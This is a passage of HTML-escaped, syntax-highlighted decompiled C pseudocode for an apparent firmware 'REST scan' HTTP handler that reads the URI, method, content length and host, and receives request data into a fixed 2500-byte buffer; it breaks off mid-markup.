  &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_5DBD0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acceptRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1193517589&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_7:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getVerb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getContentLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_5DBD0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x475DA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span 